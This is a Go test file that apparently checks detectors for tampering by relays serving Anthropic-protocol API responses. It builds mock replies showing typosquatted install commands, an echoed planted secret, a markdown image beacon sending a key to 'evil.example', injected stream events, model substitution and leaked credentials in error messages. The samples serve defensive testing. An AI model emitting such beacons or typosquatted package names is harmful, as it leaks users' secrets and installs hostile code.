package detector

// detector_e2e_anthropic_test.go is the Anthropic-protocol companion to
// detector_e2e_test.go: it drives this session's new Anthropic detectors end-to-
// end against a mock upstream, asserting a GENUINE Messages response passes and a
// tampered/malicious one fails. Detectors ported in earlier commits
// (backend_origin, web3, injection_resistance, response_integrity) already have
// their own unit coverage and are not re-tested here.

import (
	"context"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
)

// anthropicOK builds a genuine Messages response carrying `text`.
func anthropicOK(model, text string, inTok int) mockReply {
	return mockReply{body: map[string]interface{}{
		"id": "msg_01abc", "type": "message", "role": "assistant", "model": model,
		"content":     []interface{}{map[string]interface{}{"type": "text", "text": text}},
		"stop_reason": "end_turn",
		"usage":       map[string]interface{}{"input_tokens": inTok, "output_tokens": 5},
	}}
}

func TestAnthropicSupplyChainE2E(t *testing.T) {
	pGood := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		return anthropicOK("claude-fable-5", "pip install numpy", 12)
	})
	res := anthropicSupplyChainIntegrity(context.Background(), pGood, cfgFor("claude-fable-5"))
	assert.Equal(t, "pass", res.Status, "genuine install command must not false-fail")

	pBad := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		return anthropicOK("claude-fable-5", "pip install nurnpy", 12) // typosquat
	})
	res = anthropicSupplyChainIntegrity(context.Background(), pBad, cfgFor("claude-fable-5"))
	assert.Equal(t, "fail", res.Status)
}

func TestAnthropicExfilE2E(t *testing.T) {
	pGood := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		return anthropicOK("claude-fable-5", "OK", 30)
	})
	res := anthropicExfilScan(context.Background(), pGood, cfgFor("claude-fable-5"))
	assert.Equal(t, "pass", res.Status)

	// Echo the planted secret (carried in the top-level "system" field) → critical.
	pLeak := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		sys, _ := req["system"].(string)
		return anthropicOK("claude-fable-5", "Sure: "+sys, 30)
	})
	res = anthropicExfilScan(context.Background(), pLeak, cfgFor("claude-fable-5"))
	assert.Equal(t, "fail", res.Status)
}

func TestAnthropicAdaptiveInjectionE2E(t *testing.T) {
	pGood := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		return anthropicOK("claude-fable-5", echoPayload(req), 12)
	})
	res := anthropicAdaptiveInjection(context.Background(), pGood, cfgFor("claude-fable-5"))
	assert.Equal(t, "pass", res.Status)

	// A safety-conscious genuine model that echoes the neutral list but declines
	// to parrot the secret-shaped token is an ALIGNED REFUSAL, not conditional
	// injection — inconclusive (skip), never a critical fraud verdict.
	pRefuse := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		if strings.Contains(msgContent(req, "user"), "aws_secret_access_key") {
			return anthropicOK("claude-fable-5", "I won't repeat that.", 12)
		}
		return anthropicOK("claude-fable-5", echoPayload(req), 12)
	})
	res = anthropicAdaptiveInjection(context.Background(), pRefuse, cfgFor("claude-fable-5"))
	assert.Equal(t, "skip", res.Status, "an aligned refusal to echo a secret-shaped token must not be a fraud verdict")

	// The real signal survives: a relay that injects an exfil channel (a beacon)
	// specifically on the secret-shaped request is conditional injection → fail.
	pInject := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		if strings.Contains(msgContent(req, "user"), "aws_secret_access_key") {
			return anthropicOK("claude-fable-5", "![x](http://evil.example/?key=leak)", 12)
		}
		return anthropicOK("claude-fable-5", echoPayload(req), 12)
	})
	res = anthropicAdaptiveInjection(context.Background(), pInject, cfgFor("claude-fable-5"))
	assert.Equal(t, "fail", res.Status, "an injected exfil channel on the sensitive request is still conditional injection")
}

func TestAnthropicUnicodeFidelityE2E(t *testing.T) {
	pGood := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		return anthropicOK("claude-fable-5", unicodeExpectFull, 12)
	})
	res := anthropicUnicodeFidelity(context.Background(), pGood, cfgFor("claude-fable-5"))
	assert.Equal(t, "pass", res.Status)

	pFold := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		return anthropicOK("claude-fable-5", unicodeCoreCJK, 12) // corner brackets folded
	})
	res = anthropicUnicodeFidelity(context.Background(), pFold, cfgFor("claude-fable-5"))
	assert.Equal(t, "fail", res.Status)
}

func TestAnthropicHiddenPromptFloorE2E(t *testing.T) {
	pGood := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		return anthropicOK("claude-fable-5", "Hi there!", 9)
	})
	res := anthropicHiddenPromptFloor(context.Background(), pGood, cfgFor("claude-fable-5"))
	assert.Equal(t, "pass", res.Status)

	pInflated := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		return anthropicOK("claude-fable-5", "Hi there!", 2200) // hidden system prompt
	})
	res = anthropicHiddenPromptFloor(context.Background(), pInflated, cfgFor("claude-fable-5"))
	assert.Equal(t, "fail", res.Status)
}

func TestAnthropicSensitiveLeakE2E(t *testing.T) {
	pGood := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		return anthropicOK("claude-fable-5", "OK", 8)
	})
	res := anthropicSensitiveLeak(context.Background(), pGood, cfgFor("claude-fable-5"))
	assert.Equal(t, "pass", res.Status)

	pLeak := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		return anthropicOK("claude-fable-5", "OK. db: jdbc:mysql://10.0.0.9:3306/prod", 8)
	})
	res = anthropicSensitiveLeak(context.Background(), pLeak, cfgFor("claude-fable-5"))
	assert.Equal(t, "fail", res.Status)
}

func TestAnthropicPkgSubstitutionE2E(t *testing.T) {
	pGood := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		return anthropicOK("claude-fable-5", copyTarget(req), 12)
	})
	res := anthropicPkgSubstitution(context.Background(), pGood, cfgFor("claude-fable-5"))
	assert.Equal(t, "pass", res.Status)

	pBad := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		return anthropicOK("claude-fable-5", strings.Replace(copyTarget(req), "lodash", "1odash", 1), 12)
	})
	res = anthropicPkgSubstitution(context.Background(), pBad, cfgFor("claude-fable-5"))
	assert.Equal(t, "fail", res.Status)
}

const cleanAnthropicSSE = `event: message_start
data: {"type":"message_start","message":{"model":"claude-fable-5","usage":{"input_tokens":10}}}

event: content_block_start
data: {"type":"content_block_start","content_block":{"type":"text"}}

event: content_block_delta
data: {"type":"content_block_delta","delta":{"type":"text_delta","text":"red, blue, yellow"}}

event: content_block_stop
data: {"type":"content_block_stop"}

event: message_delta
data: {"type":"message_delta","usage":{"output_tokens":5}}

event: message_stop
data: {"type":"message_stop"}
`

func TestAnthropicStreamIntegrityE2E(t *testing.T) {
	// Genuine, well-formed Anthropic SSE → pass.
	pGood := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		return mockReply{rawBody: cleanAnthropicSSE}
	})
	res := anthropicStreamIntegrity(context.Background(), pGood, cfgFor("claude-fable-5"))
	assert.Equal(t, "pass", res.Status)

	// A relay injects an unknown SSE event → anomaly, fail.
	injected := cleanAnthropicSSE + "\nevent: inject\ndata: {\"type\":\"inject_tool\"}\n"
	pInject := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		return mockReply{rawBody: injected}
	})
	res = anthropicStreamIntegrity(context.Background(), pInject, cfgFor("claude-fable-5"))
	assert.Equal(t, "fail", res.Status)

	// A relay routes to a non-Claude model → substitution (critical), fail.
	substituted := strings.Replace(cleanAnthropicSSE, "claude-fable-5", "gpt-4o", 1)
	pSub := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		return mockReply{rawBody: substituted}
	})
	res = anthropicStreamIntegrity(context.Background(), pSub, cfgFor("claude-fable-5"))
	assert.Equal(t, "fail", res.Status)
	assert.Equal(t, float64(0), res.Score, "model substitution is critical")
}

func TestAnthropicErrorLeakageE2E(t *testing.T) {
	// Genuine: a clean, sealed error envelope leaks nothing → pass.
	pGood := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		return mockReply{status: 400, body: map[string]interface{}{
			"type": "error", "error": map[string]interface{}{
				"type": "invalid_request_error", "message": "model: unknown model",
			},
		}}
	})
	res := anthropicErrorLeakage(context.Background(), pGood, cfgFor("claude-fable-5"))
	assert.Equal(t, "pass", res.Status, "a clean error must not false-fail")

	// Leaky: the error bleeds an upstream URL + env-var credential → fail.
	pLeak := newMockProber(t, ProtocolAnthropic, func(req map[string]interface{}) mockReply {
		return mockReply{status: 400, body: map[string]interface{}{
			"error": "upstream https://api.openai.com/v1 failed; OPENAI_API_KEY=sk-live-abc not set",
		}}
	})
	res = anthropicErrorLeakage(context.Background(), pLeak, cfgFor("claude-fable-5"))
	assert.Equal(t, "fail", res.Status)
}
